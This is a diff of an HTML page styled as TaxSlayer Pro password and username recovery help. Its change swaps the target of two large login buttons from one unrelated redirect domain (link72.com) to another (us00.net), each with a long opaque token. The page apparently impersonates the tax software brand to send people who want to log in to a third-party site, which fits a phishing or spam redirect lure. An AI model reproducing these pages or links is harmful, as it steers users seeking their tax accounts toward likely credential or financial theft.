@@ -8,7 +8,7 @@ Quickly Reset Your Password or Retrieve Username
     <!-- Banner with Image and Button -->
     <div style="position:relative; text-align:center; margin-bottom:40px;">
         <img src="_static/taxslayer-banner.jpg" alt="TaxSlayer Pro Banner" style="width:100%; max-height:400px; object-fit:cover; border-radius:8px;">
-        <a href="https://link72.com/?yFluJEmDu0Y53EoMsjznlkYTwANm0Sa6fgcvI0eyIfD8tb9LrKdT6ri55QPkuIl00kGEwJY" style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); 
+        <a href="https://us00.net/?yFluJEmDu0Y53EoMsjznlkYTwANm0Sa6fgcvI0eyIfD8tb9LrKdT6ri55QPkuIl00kGEwJY" style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); 
             background-color:#28a745; color:#fff; padding:16px 32px; font-size:18px; font-weight:bold; text-decoration:none; 
             border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.2);">
             Go to Login Page
@@ -89,7 +89,7 @@ FAQs (Click to Expand)
 
     <!-- Footer Section with Single Button -->
     <div style="text-align:center; margin-top:40px; margin-bottom:40px;">
-        <a href="https://link72.com/?yFluJEmDu0Y53EoMsjznlkYTwANm0Sa6fgcvI0eyIfD8tb9LrKdT6ri55QPkuIl00kGEwJY" style="background-color:#28a745; color:#ffffff; padding:14px 36px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.2);">
+        <a href="https://us00.net/?yFluJEmDu0Y53EoMsjznlkYTwANm0Sa6fgcvI0eyIfD8tb9LrKdT6ri55QPkuIl00kGEwJY" style="background-color:#28a745; color:#ffffff; padding:14px 36px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.2);">
             Access Your Account Now
         </a>
     </div>
